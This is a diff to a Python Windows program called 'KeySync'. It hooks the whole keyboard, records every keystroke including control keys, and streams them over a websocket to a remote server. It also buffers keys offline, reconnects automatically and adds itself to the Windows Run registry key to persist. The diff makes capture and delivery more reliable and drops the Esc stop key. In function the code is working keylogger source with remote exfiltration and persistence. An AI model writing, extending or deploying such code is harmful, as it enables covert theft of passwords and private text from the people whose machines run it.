@@ -1,21 +1,106 @@
 # ← Primary client: System Tray + KB Hook + WS
 import asyncio
 import threading
+import logging
 import websockets
+from websockets.exceptions import ConnectionClosed, WebSocketException
 from pynput import keyboard
 from pystray import Icon, MenuItem, Menu
 from PIL import Image, ImageDraw
-import queue
 import sys
 import os
 import winreg
 
 # =========================
+# LOGGING  (FIX #2)
+# =========================
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    handlers=[
+        logging.StreamHandler(sys.stdout),
+        logging.FileHandler("keysync.log", encoding="utf-8"),
+    ],
+)
+log = logging.getLogger(__name__)
+
+# =========================
 # CONFIG
 # =========================
 URI = "wss://wan-data-t.onrender.com/ws"
-running = True
-message_queue = queue.Queue()
+OFFLINE_BUFFER_FILE = "offline_buffer.txt"
+
+# State and locks
+is_connected = False
+_file_lock = threading.Lock()
+
+# FIX M1 — Proper shutdown: one threading.Event drives ALL threads/tasks.
+# When ESC is pressed or Exit is clicked, shutdown_event is set and every
+# loop checks it, so nothing lingers in the background.
+shutdown_event = threading.Event()          # checked by sync (keyboard) thread
+_async_shutdown: asyncio.Event | None = None  # checked by async (WS) tasks
+
+# FIX #4 — asyncio.Queue replaces stdlib queue.Queue.
+# The keyboard thread pushes messages via loop.call_soon_threadsafe,
+# ensuring thread-safe delivery into the async event loop.
+_loop: asyncio.AbstractEventLoop | None = None
+async_message_queue: asyncio.Queue = asyncio.Queue()
+
+
+def _append_to_offline_file(msg: str):
+    """Append a message to the offline buffer file. Thread-safe."""
+    with _file_lock:
+        try:
+            with open(OFFLINE_BUFFER_FILE, "a", encoding="utf-8") as f:
+                f.write(msg + "\n")
+            log.info("[Buffer] Saved offline: %s", msg)
+        except OSError as e:
+            log.error("[Buffer] Failed to write to offline file: %s", e)
+
+
+async def flush_offline_buffer(websocket):
+    """Reads the offline buffer file and sends all pending messages in order. Thread-safe."""
+    if not os.path.exists(OFFLINE_BUFFER_FILE):
+        return
+
+    log.info("[WS] Flushing offline buffer...")
+    with _file_lock:
+        try:
+            with open(OFFLINE_BUFFER_FILE, "r", encoding="utf-8") as f:
+                lines = f.readlines()
+        except OSError as e:
+            log.error("[WS] Failed to read offline buffer file: %s", e)
+            return
+
+    if not lines:
+        return
+
+    unsent_index = 0
+    try:
+        for i, line in enumerate(lines):
+            msg = line.rstrip('\n')
+            await websocket.send(msg)
+            log.info("[WS] Sent offline buffered message: %s", msg)
+            unsent_index = i + 1
+    except (ConnectionClosed, WebSocketException, OSError) as e:
+        log.error("[WS] Failed to send buffered message at index %d: %s", unsent_index, e)
+        # Rewrite the remaining unsent messages to the file
+        with _file_lock:
+            try:
+                with open(OFFLINE_BUFFER_FILE, "w", encoding="utf-8") as f:
+                    f.writelines(lines[unsent_index:])
+            except OSError as we:
+                log.error("[WS] Failed to rewrite remaining buffered messages: %s", we)
+        raise  # bubble up to trigger reconnection/disconnect handling
+
+    # If we got here, all messages were successfully sent
+    with _file_lock:
+        try:
+            os.remove(OFFLINE_BUFFER_FILE)
+            log.info("[WS] Offline buffer cleared successfully.")
+        except OSError as e:
+            log.error("[WS] Failed to delete offline buffer file: %s", e)
+
 
 # =========================
 # STARTUP REGISTRATION
@@ -23,44 +108,85 @@ message_queue = queue.Queue()
 APP_NAME = "KeySync_WAN_Tray"
 REG_PATH = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 
+def _open_run_key(access=winreg.KEY_READ | winreg.KEY_WRITE):
+    """Open HKCU\\...\\Run with the requested access flags."""
+    return winreg.CreateKeyEx(
+        winreg.HKEY_CURRENT_USER, REG_PATH, 0, access
+    )
+
+
 def register_startup():
-    """Register this app in the Windows Startup registry."""
+    """Register this app in the Windows Startup registry.
+
+    FIX M3 — Dedup check: only write if the stored path differs from the
+    current executable path.  No more spam on every launch.
+    """
     try:
-        # frozen=True means we're running as a PyInstaller-built .exe
-        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        exe_path  = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
         reg_value = f'"{exe_path}"'
 
-        # CreateKeyEx — creates the key if missing, otherwise opens it
-        key = winreg.CreateKeyEx(
-            winreg.HKEY_CURRENT_USER,
-            REG_PATH,
-            0,
-            winreg.KEY_READ | winreg.KEY_WRITE
-        )
-
-        # Check whether the same path is already registered
+        key = _open_run_key()
         try:
             current_val, _ = winreg.QueryValueEx(key, APP_NAME)
             if current_val == reg_value:
-                winreg.CloseKey(key)
-                print("[Startup] Already registered, skipping.")
-                return
+                log.info("[Startup] Already registered — skipping.")
+                return          # exact match: nothing to do
+            # Path changed (e.g. exe moved) — fall through to update
+            log.info("[Startup] Path changed — updating registry entry.")
         except FileNotFoundError:
-            pass  # Not registered yet
+            pass  # not registered yet — fall through to write
+        finally:
+            winreg.CloseKey(key)
 
-        # Set/update the value (new entry or path changed)
+        # Write / update the value
+        key = _open_run_key()
         winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, reg_value)
         winreg.CloseKey(key)
-        print(f"[Startup] Registered successfully: {exe_path}")
+        log.info("[Startup] Registered: %s", exe_path)
 
-    except Exception as e:
-        print(f"[Startup] Failed to register: {e}")
+    except OSError as e:
+        log.error("[Startup] Failed to register: %s", e)
+
+
+def unregister_startup():
+    """FIX M3 — Remove the startup registry entry (called from tray menu)."""
+    try:
+        key = _open_run_key()
+        try:
+            winreg.DeleteValue(key, APP_NAME)
+            log.info("[Startup] Removed from startup.")
+        except FileNotFoundError:
+            log.info("[Startup] No entry found — nothing to remove.")
+        finally:
+            winreg.CloseKey(key)
+    except OSError as e:
+        log.error("[Startup] Failed to remove: %s", e)
 
 # =========================
 # KEY CONVERTER
 # =========================
-ctrl_held = False
-alt_held  = False
+# FIX #3 — Use a threading.Lock + set per physical modifier key.
+# Each key object (ctrl_l / ctrl_r) is stored individually so releasing
+# one side doesn't clear the other.  On focus-loss or any release event
+# the exact key is discarded — no more phantom stuck modifiers.
+_modifier_lock = threading.Lock()
+_ctrl_keys_held: set = set()
+_alt_keys_held:  set = set()
+
+CTRL_KEYS  = {keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}
+ALT_KEYS   = {keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.alt_gr}
+SHIFT_KEYS = {keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r}
+
+
+def _ctrl_held() -> bool:
+    with _modifier_lock:
+        return bool(_ctrl_keys_held)
+
+
+def _alt_held() -> bool:
+    with _modifier_lock:
+        return bool(_alt_keys_held)
+
 
 SPECIAL_KEYS = {
     keyboard.Key.enter:      "[Enter]",
@@ -87,33 +213,36 @@ SPECIAL_KEYS = {
 }
 
 def key_to_str(key):
-    global ctrl_held, alt_held
+    ctrl = _ctrl_held()
+    alt  = _alt_held()
 
-    # Modifier tracking — return None (do not add to buffer)
-    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
-        ctrl_held = True
+    # Modifier presses — update set, return None (don't add to buffer)
+    if key in CTRL_KEYS:
+        with _modifier_lock:
+            _ctrl_keys_held.add(key)
         return None
-    if key in (keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.alt_gr):
-        alt_held = True
+    if key in ALT_KEYS:
+        with _modifier_lock:
+            _alt_keys_held.add(key)
         return None
-    if key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
+    if key in SHIFT_KEYS:
         return None
 
     # Printable character
     if hasattr(key, 'char') and key.char is not None:
         char = key.char
         # Ctrl+letter (Ctrl+A = \x01 ... Ctrl+Z = \x1a)
-        if ctrl_held and ord(char) < 32:
+        if ctrl and ord(char) < 32:
             letter = chr(ord(char) + 64)
-            prefix = "Ctrl+Alt+" if alt_held else "Ctrl+"
+            prefix = "Ctrl+Alt+" if alt else "Ctrl+"
             return f"[{prefix}{letter}]"
         return char
 
     # Known special key
     if key in SPECIAL_KEYS:
         label = SPECIAL_KEYS[key]
-        if ctrl_held:
-            return f"[Ctrl+{label[1:]}"  # [Ctrl+Delete] etc
+        if ctrl:
+            return f"[Ctrl+{label[1:]}"  # [Ctrl+Delete] etc.
         return label
 
     # Unknown fallback
@@ -123,84 +252,257 @@ def key_to_str(key):
 # KEYBOARD
 # =========================
 typed_buffer = ""
+FLUSH_PUNCTUATION = set('.,!?;:\'"()[]{}\\/-_@#$%^&*+=<>~`|')
+
+# Auto-flush timer: if the user pauses typing for BUFFER_TIMEOUT seconds,
+# whatever is in typed_buffer is sent automatically — no space needed.
+BUFFER_TIMEOUT = 1.5   # seconds of inactivity before auto-send
+_flush_timer: threading.Timer | None = None
+_buffer_lock  = threading.Lock()   # protects typed_buffer + _flush_timer
+
+
+def _enqueue_message(msg: str):
+    """Thread-safe push into the asyncio queue on the WS event loop."""
+    if _loop is not None and _loop.is_running():
+        _loop.call_soon_threadsafe(async_message_queue.put_nowait, msg)
+
+
+def _process_generated_message(msg: str):
+    """Router for messages: sends to event loop if connected, otherwise appends to file."""
+    global is_connected
+    if is_connected:
+        _enqueue_message(msg)
+    else:
+        _append_to_offline_file(msg)
+
+
+def _flush_buffer():
+    """Called by the inactivity timer — send whatever is in typed_buffer."""
+    global typed_buffer
+    with _buffer_lock:
+        if typed_buffer:
+            _process_generated_message(typed_buffer)
+            typed_buffer = ""
+
+
+def _reset_flush_timer():
+    """Cancel any pending timer and start a fresh one."""
+    global _flush_timer
+    if _flush_timer is not None:
+        _flush_timer.cancel()
+    _flush_timer = threading.Timer(BUFFER_TIMEOUT, _flush_buffer)
+    _flush_timer.daemon = True
+    _flush_timer.start()
+
+
+def _trigger_shutdown():
+    """FIX M1 — Signal every layer to stop cleanly."""
+    shutdown_event.set()
+    if _loop is not None and _loop.is_running() and _async_shutdown is not None:
+        _loop.call_soon_threadsafe(_async_shutdown.set)
+
 
 def on_press(key):
-    global typed_buffer, running
+    global typed_buffer
+
+    if shutdown_event.is_set():
+        return False  # stop the listener only on clean shutdown
+
+    # Update modifier sets
+    if key in CTRL_KEYS:
+        with _modifier_lock:
+            _ctrl_keys_held.add(key)
+        return
+    if key in ALT_KEYS:
+        with _modifier_lock:
+            _alt_keys_held.add(key)
+        return
 
     label = key_to_str(key)
     if label is None:
         return  # pure modifier, skip
 
-    # Space → flush word buffer (space itself is not sent)
-    if key == keyboard.Key.space:
-        if typed_buffer:
-            message_queue.put(typed_buffer)
-            typed_buffer = ""
+    with _buffer_lock:
+        # Space: flush buffer + send a space token, then reset the idle timer
+        if key == keyboard.Key.space:
+            if typed_buffer:
+                _process_generated_message(typed_buffer)
+                typed_buffer = ""
+            _process_generated_message("[Space]")
+            _reset_flush_timer()   # restart timer (nothing left in buffer, but harmless)
 
-    # Printable character → append to buffer
-    elif hasattr(key, 'char') and key.char is not None and not ctrl_held:
-        typed_buffer += label
+        # Printable character
+        elif hasattr(key, 'char') and key.char is not None and not _ctrl_held():
+            char = key.char
+            if char in FLUSH_PUNCTUATION:
+                # Punctuation: flush current word, send punctuation separately
+                if typed_buffer:
+                    _process_generated_message(typed_buffer)
+                    typed_buffer = ""
+                _process_generated_message(char)
+                _reset_flush_timer()
+            else:
+                # Normal letter/digit: append and reset the inactivity timer
+                typed_buffer += label
+                _reset_flush_timer()  # auto-sends after BUFFER_TIMEOUT of silence
 
-    # Special key → instantly send
-    else:
-        if typed_buffer:
-            message_queue.put(typed_buffer)
-            typed_buffer = ""
-        message_queue.put(label)
+        # Special key: flush buffer immediately, then send the special key
+        else:
+            if typed_buffer:
+                _process_generated_message(typed_buffer)
+                typed_buffer = ""
+            _process_generated_message(label)
+            _reset_flush_timer()
+            # ESC is no longer a shutdown trigger — it just sends [Esc]
 
-        if key == keyboard.Key.esc:
-            running = False
-            return False
 
 def on_release(key):
-    global ctrl_held, alt_held
-    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
-        ctrl_held = False
-    if key in (keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.alt_gr):
-        alt_held = False
+    # FIX #3 — discard the exact physical key so the other side stays tracked
+    with _modifier_lock:
+        _ctrl_keys_held.discard(key)
+        _alt_keys_held.discard(key)
+
 
 def start_keyboard_listener():
     with keyboard.Listener(
         on_press=on_press,
-        on_release=on_release    # ← this was previously missing
+        on_release=on_release
     ) as listener:
         listener.join()
+    log.info("[KB] Listener stopped.")
 
 # =========================
 # WEBSOCKET
 # =========================
-async def send_messages(websocket):
-    global running
-    while running:
+PING_INTERVAL       = 25   # seconds between keepalive pings
+MAX_RECONNECT_DELAY = 60   # FIX #1 — cap exponential backoff at 60 s
+
+def _dump_queue_to_offline_file(failed_msg: str | None):
+    """Saves any failed/pending messages in the queue to the offline buffer file and clears it."""
+    global is_connected
+    is_connected = False
+    with _file_lock:
         try:
-            if not message_queue.empty():
-                msg = message_queue.get()
+            with open(OFFLINE_BUFFER_FILE, "a", encoding="utf-8") as f:
+                if failed_msg is not None:
+                    f.write(failed_msg + "\n")
+                    log.info("[Buffer] Saved failed msg to file: %s", failed_msg)
+
+                # Drain the asyncio.Queue
+                while not async_message_queue.empty():
+                    try:
+                        msg = async_message_queue.get_nowait()
+                        f.write(msg + "\n")
+                        log.info("[Buffer] Saved queued msg to file: %s", msg)
+                    except asyncio.QueueEmpty:
+                        break
+        except OSError as e:
+            log.error("[Buffer] Failed to write queue to offline file: %s", e)
+
+
+async def send_messages(websocket):
+    """Drain async_message_queue and send; also send keepalive pings."""
+    last_ping = asyncio.get_event_loop().time()
+    msg = None
+    try:
+        while not _async_shutdown.is_set():
+            msg = None
+            try:
+                msg = await asyncio.wait_for(async_message_queue.get(), timeout=0.05)
                 await websocket.send(msg)
-                print("Sent:", msg)
-            await asyncio.sleep(0.01)
-        except:
-            break
+                log.info("Sent: %s", msg)
+                msg = None
+            except asyncio.TimeoutError:
+                pass  # nothing to send this tick
+
+            # Keepalive ping
+            now = asyncio.get_event_loop().time()
+            if now - last_ping >= PING_INTERVAL:
+                await websocket.ping()
+                last_ping = now
+                log.info("[Ping] keepalive sent")
+    except (ConnectionClosed, WebSocketException, OSError) as e:
+        log.warning("[WS] send_messages: connection lost — %s. Dumping queue.", e)
+        _dump_queue_to_offline_file(msg)
+    except asyncio.CancelledError:
+        log.info("[WS] send_messages: cancelled. Dumping queue.")
+        _dump_queue_to_offline_file(msg)
+        raise
+    except Exception as e:
+        log.error("[WS] send_messages: unexpected error: %s. Dumping queue.", e, exc_info=True)
+        _dump_queue_to_offline_file(msg)
+
 
 async def receive_messages(websocket):
-    global running
-    while running:
+    while not _async_shutdown.is_set():
         try:
             message = await websocket.recv()
-            print(f"\nFriend: {message}")
-        except:
+            log.info("Friend: %s", message)
+
+        except ConnectionClosed as e:
+            log.warning("[WS] receive_messages: connection closed — %s", e)
+            break
+        except WebSocketException as e:
+            log.error("[WS] receive_messages: WebSocket error — %s", e, exc_info=True)
+            break
+        except OSError as e:
+            log.error("[WS] receive_messages: network error — %s", e, exc_info=True)
             break
 
+
 async def websocket_client():
-    global running
-    try:
-        async with websockets.connect(URI) as websocket:
-            print("Connected")
-            await asyncio.gather(
-                send_messages(websocket),
-                receive_messages(websocket)
-            )
-    except Exception as e:
-        print("Connection Error:", e)
+    """
+    Auto-reconnection with exponential back-off.
+    FIX M1 — Loops on _async_shutdown instead of global bool `running`.
+    """
+    global _loop, _async_shutdown, is_connected
+    _loop = asyncio.get_event_loop()         # expose loop for keyboard thread
+    _async_shutdown = asyncio.Event()        # FIX M1 — async shutdown signal
+    delay = 2
+
+    while not _async_shutdown.is_set():
+        try:
+            log.info("[WS] Connecting to %s ...", URI)
+            async with websockets.connect(
+                URI,
+                ping_interval=None,
+                close_timeout=10,
+                open_timeout=15,
+            ) as websocket:
+                log.info("[WS] Connected ✓")
+                # Flush the offline buffer first before routing new keyboard inputs
+                await flush_offline_buffer(websocket)
+
+                is_connected = True
+                delay = 2  # reset backoff on successful connection
+                await asyncio.gather(
+                    send_messages(websocket),
+                    receive_messages(websocket)
+                )
+            log.info("[WS] Connection closed cleanly.")
+
+        except ConnectionClosed as e:
+            log.warning("[WS] Disconnected: %s", e)
+        except WebSocketException as e:
+            log.error("[WS] WebSocket error: %s", e, exc_info=True)
+        except OSError as e:
+            log.error("[WS] Network error: %s", e, exc_info=True)
+        except asyncio.CancelledError:
+            log.info("[WS] Cancelled, shutting down.")
+            break
+        finally:
+            is_connected = False
+
+        if _async_shutdown.is_set():
+            break
+
+        log.info("[WS] Reconnecting in %ds... (exponential backoff)", delay)
+        # FIX M1 — wait on shutdown event so ESC cancels the sleep instantly
+        try:
+            await asyncio.wait_for(_async_shutdown.wait(), timeout=delay)
+        except asyncio.TimeoutError:
+            pass  # timeout expired — reconnect
+        delay = min(delay * 2, MAX_RECONNECT_DELAY)
 
 # =========================
 # TRAY
@@ -211,36 +513,49 @@ def create_image():
     draw.rectangle((18, 18, 46, 46), fill=(0, 255, 120))
     return image
 
-def quit_app(icon):
-    global running
-    running = False
-    icon.stop()
-    print("Exiting...")
-    sys.exit()
+
+def quit_app(icon, item=None):
+    """FIX M1 — Clean shutdown: signal all threads then stop the tray."""
+    log.info("[Tray] Exit requested.")
+    _trigger_shutdown()   # signals keyboard thread + async WS loop
+    icon.stop()           # stops the pystray event loop
+    # Give daemon threads a moment to finish cleanly before the process dies
+    shutdown_event.wait(timeout=3)
+    log.info("[Tray] Goodbye.")
+    sys.exit(0)
+
+
+def remove_startup(icon, item=None):
+    """FIX M3 — Tray menu action: remove startup registry entry."""
+    unregister_startup()
+
 
 def start_tray():
     icon = Icon(
         "KeySync",
         create_image(),
-        menu=Menu(MenuItem("Exit", quit_app))
+        menu=Menu(
+            MenuItem("Remove from Startup", remove_startup),  # FIX M3
+            MenuItem("Exit", quit_app),
+        ),
     )
     icon.run()
+
 
 # =========================
 # MAIN
 # =========================
 if __name__ == "__main__":
-    # Register in Windows Startup
     register_startup()
 
     threading.Thread(
         target=lambda: asyncio.run(websocket_client()),
-        daemon=True
+        daemon=True,
     ).start()
 
     threading.Thread(
         target=start_keyboard_listener,
-        daemon=True
+        daemon=True,
     ).start()
 
     start_tray()
